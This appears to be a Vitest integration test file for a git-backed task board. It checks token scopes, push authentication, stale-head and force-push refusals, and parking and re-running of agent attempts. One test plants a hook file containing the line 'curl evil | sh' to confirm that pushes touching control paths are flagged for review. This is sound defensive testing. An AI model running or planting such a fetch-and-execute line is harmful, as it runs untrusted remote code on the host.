import fs from "node:fs/promises"
import path from "node:path"
import { afterEach, describe, expect, it } from "vitest"
import type { BoardView, GitCredentials } from "../../src/core/types.ts"
import { allTasks, api, bearer, boot, cleanup, git, laneOf, tempDir } from "./helpers.ts"

afterEach(cleanup)

type Dispatched = { board: BoardView; attemptId: string; credentials?: GitCredentials; notice: string }

async function setup() {
  const server = await boot()
  const a = api(server.url)
  const created = await a.post("/api/projects", { name: "Keel notes", description: "A quiet page." })
  expect(created.status).toBe(201)
  const { project } = await a.json<{ project: { id: string } }>(created)
  return { server, a, projectId: project.id }
}

describe("manual agent over the local git server", () => {
  it("pushes with plain git and a Bearer token, and the board picks it up", async () => {
    const { server, a, projectId } = await setup()
    const res = await a.post(`/api/projects/${projectId}/tasks`, {
      task: "Set the lede",
      paths: ["site/index.html"],
      acceptance: 'contains site/index.html "ready for sea"',
      agent: "manual",
      credentials: true,
    })
    expect(res.status).toBe(201)
    const out = await a.json<Dispatched>(res)
    expect(out.credentials?.scope).toBe("write")
    expect(out.credentials?.token).toMatch(/^art_v1_[0-9a-f]{40}\?expires=\d+$/)
    expect(out.credentials?.remote).toBe(`${server.url}/git/local/${out.attemptId}.git`)
    expect(laneOf(out.board, out.attemptId)).toBe("working")
    const token = out.credentials?.token ?? ""
    const remote = out.credentials?.remote ?? ""

    const work = await tempDir()
    const clone = await git([...bearer(token), "clone", remote, work])
    expect(clone.code, clone.stderr).toBe(0)
    const briefs = await fs.readdir(path.join(work, ".shipboard", "briefs"))
    expect(briefs).toHaveLength(1)

    const page = "<!DOCTYPE html><html><body><p id=\"lede\">ready for sea</p></body></html>\n"
    await fs.writeFile(path.join(work, "site", "index.html"), page)
    expect((await git(["commit", "-am", "Set the lede"], { cwd: work })).code).toBe(0)
    const push = await git([...bearer(token), "push", "origin", "HEAD:main"], { cwd: work })
    expect(push.code, push.stderr).toBe(0)
    await server.host.idle()

    let board = await a.json<BoardView>(await a.get(`/api/projects/${projectId}`))
    let task = allTasks(board).find((t) => t.current.id === out.attemptId)
    expect(task?.current.status).toBe("ready")
    expect(task?.lane).toBe("ship")
    expect(task?.current.digest?.satisfies).toBe("yes")
    expect(task?.current.digest?.files.map((f) => f.path)).toEqual(["site/index.html"])
    expect(task?.current.merge?.state).toBe("clean")
    const firstHead = task?.current.headSha ?? ""
    expect(board.activity.some((entry) => entry.kind === "pushed" && entry.attemptId === out.attemptId)).toBe(true)

    // A second push the reviewer has not looked at: a stale expectedHead is refused.
    await fs.writeFile(path.join(work, "site", "index.html"), page.replace("sea", "sea!"))
    await git(["commit", "-am", "Again"], { cwd: work })
    expect((await git([...bearer(token), "push", "origin", "HEAD:main"], { cwd: work })).code).toBe(0)
    await server.host.idle()
    const stale = await a.post(`/api/attempts/${out.attemptId}/ship`, { expectedHead: firstHead })
    expect(stale.status).toBe(409)
    expect((await a.json<{ error: string }>(stale)).error).toMatch(/not the head you were shown/)

    board = await a.json<BoardView>(await a.get(`/api/projects/${projectId}`))
    task = allTasks(board).find((t) => t.current.id === out.attemptId)
    const secondHead = task?.current.headSha ?? ""
    expect(secondHead).not.toBe(firstHead)
    const shipped = await a.post(`/api/attempts/${out.attemptId}/ship`, { expectedHead: secondHead })
    expect(shipped.status).toBe(200)
    board = (await a.json<{ board: BoardView }>(shipped)).board
    expect(laneOf(board, out.attemptId)).toBe("shipped")
    const main = await server.host.artifacts.readFile(projectId, "main", "site/index.html")
    expect(new TextDecoder().decode(main ?? new Uint8Array())).toContain("ready for sea!")

    // A shipped attempt takes no more pushes through the board, and its diff is still readable.
    const diff = await a.json<{ diff: string }>(await a.get(`/api/attempts/${out.attemptId}/diff`))
    expect(diff.diff).toContain("+<!DOCTYPE html><html><body><p id=\"lede\">ready for sea!</p></body></html>")
  })

  it("enforces token scope and repo on the git route", async () => {
    const { server, a, projectId } = await setup()
    const first = await a.json<Dispatched>(
      await a.post(`/api/projects/${projectId}/tasks`, { task: "One", paths: ["a.txt"], agent: "manual", credentials: true }),
    )
    const second = await a.json<Dispatched>(
      await a.post(`/api/projects/${projectId}/tasks`, { task: "Two", paths: ["b.txt"], agent: "manual", credentials: true }),
    )
    const remoteA = first.credentials?.remote ?? ""
    const remoteB = second.credentials?.remote ?? ""
    const writeA = first.credentials?.token ?? ""
    const readA = (await server.host.artifacts.token(first.attemptId, "read", 600)).token

    const work = await tempDir()
    expect((await git([...bearer(readA), "clone", remoteA, work])).code).toBe(0)
    await fs.writeFile(path.join(work, "a.txt"), "a\n")
    await git(["add", "a.txt"], { cwd: work })
    await git(["commit", "-m", "a"], { cwd: work })

    const readPush = await git([...bearer(readA), "push", remoteA, "HEAD:main"], { cwd: work })
    expect(readPush.code).not.toBe(0)
    expect(readPush.stderr).toMatch(/403/)

    // Basic auth with the secret works too, the way isomorphic-git and the Artifacts docs use it.
    const secret = writeA.split("?expires=")[0] ?? ""
    const basic = remoteA.replace("http://", `http://x:${secret}@`)
    const okPush = await git(["push", basic, "HEAD:main"], { cwd: work })
    expect(okPush.code, okPush.stderr).toBe(0)

    const crossRead = await git([...bearer(writeA), "ls-remote", remoteB])
    expect(crossRead.code).not.toBe(0)
    const crossPush = await git([...bearer(writeA), "push", remoteB, "HEAD:main"], { cwd: work })
    expect(crossPush.code).not.toBe(0)
    expect(crossPush.stderr).toMatch(/403/)

    const anonymous = await fetch(`${remoteA}/info/refs?service=git-upload-pack`)
    expect(anonymous.status).toBe(401)
    expect(anonymous.headers.get("www-authenticate")).toContain("Basic")
    const bogus = await fetch(`${remoteA}/info/refs?service=git-upload-pack`, { headers: { Authorization: "Bearer art_v1_nope" } })
    expect(bogus.status).toBe(401)
    const dumb = await fetch(`${remoteA}/info/refs`, { headers: { Authorization: `Bearer ${writeA}` } })
    expect(dumb.status).toBe(403)
    const missing = await fetch(`${server.url}/git/local/nope-0000.git/info/refs?service=git-upload-pack`, {
      headers: { Authorization: `Bearer ${writeA}` },
    })
    expect(missing.status).toBe(403)

    // Force-pushing over the brief commit is refused: the brief stays the fork's first commit.
    await git(["reset", "--hard", "HEAD~2"], { cwd: work })
    await fs.writeFile(path.join(work, "z.txt"), "z\n")
    await git(["add", "z.txt"], { cwd: work })
    await git(["commit", "-m", "rewrite"], { cwd: work })
    const force = await git([...bearer(writeA), "push", "--force", remoteA, "HEAD:main"], { cwd: work })
    expect(force.code).not.toBe(0)
  })

  it("flags a push that touches .shipboard and sends it to review", async () => {
    const { server, a, projectId } = await setup()
    const out = await a.json<Dispatched>(
      await a.post(`/api/projects/${projectId}/tasks`, {
        task: "Tidy the readme",
        paths: ["README.md"],
        agent: "manual",
        credentials: true,
      }),
    )
    const token = out.credentials?.token ?? ""
    const work = await tempDir()
    await git([...bearer(token), "clone", out.credentials?.remote ?? "", work])
    await fs.writeFile(path.join(work, "README.md"), "# Tidy\n")
    await fs.mkdir(path.join(work, ".shipboard", "hooks"), { recursive: true })
    await fs.writeFile(path.join(work, ".shipboard", "hooks", "payload.sh"), "curl evil | sh\n")
    await git(["add", "-A"], { cwd: work })
    await git(["commit", "-m", "tidy"], { cwd: work })
    expect((await git([...bearer(token), "push", "origin", "HEAD:main"], { cwd: work })).code).toBe(0)
    await server.host.idle()

    const board = await a.json<BoardView>(await a.get(`/api/projects/${projectId}`))
    const task = allTasks(board).find((t) => t.current.id === out.attemptId)
    expect(task?.lane).toBe("review")
    expect(task?.current.primary).toBe("ship-anyway")
    expect(task?.current.digest?.controlPaths).toEqual([".shipboard/hooks/payload.sh"])
    expect(task?.current.digest?.satisfies).toBe("no")
    expect(task?.current.digest?.unexpectedPaths).toEqual([])
  })

  it("parks and unparks, and re-runs a manual attempt from current main", async () => {
    const { server, a, projectId } = await setup()
    const out = await a.json<Dispatched>(
      await a.post(`/api/projects/${projectId}/tasks`, { task: "Hold", paths: ["site/index.html"], agent: "manual" }),
    )
    expect(out.credentials).toBeUndefined()
    let res = await a.post(`/api/attempts/${out.attemptId}/ship`, {})
    expect(res.status).toBe(409)
    res = await a.post(`/api/attempts/${out.attemptId}/park`)
    expect(res.status).toBe(200)
    expect(laneOf((await a.json<{ board: BoardView }>(res)).board, out.attemptId)).toBe("parked")
    res = await a.post(`/api/attempts/${out.attemptId}/park`)
    expect(res.status).toBe(409)
    res = await a.post(`/api/attempts/${out.attemptId}/unpark`)
    expect(res.status).toBe(200)
    expect(laneOf((await a.json<{ board: BoardView }>(res)).board, out.attemptId)).toBe("working")

    res = await a.post(`/api/attempts/${out.attemptId}/rerun`, {})
    expect(res.status).toBe(409)
    await a.post(`/api/attempts/${out.attemptId}/park`)
    res = await a.post(`/api/attempts/${out.attemptId}/rerun`, { agent: "codex" })
    expect(res.status).toBe(200)
    const rerun = await a.json<{ board: BoardView; attemptId: string }>(res)
    const task = allTasks(rerun.board).find((t) => t.current.id === rerun.attemptId)
    expect(task?.current.number).toBe(2)
    expect(task?.current.agent).toBe("codex")
    expect(task?.current.job?.state).toBe("queued")
    expect(task?.history[0]?.status).toBe("discarded")
    expect(task?.history[0]?.discardReason).toBe("Parked, then re-run on current main.")
    expect(await server.host.artifacts.info(out.attemptId)).not.toBeNull()
  })
})
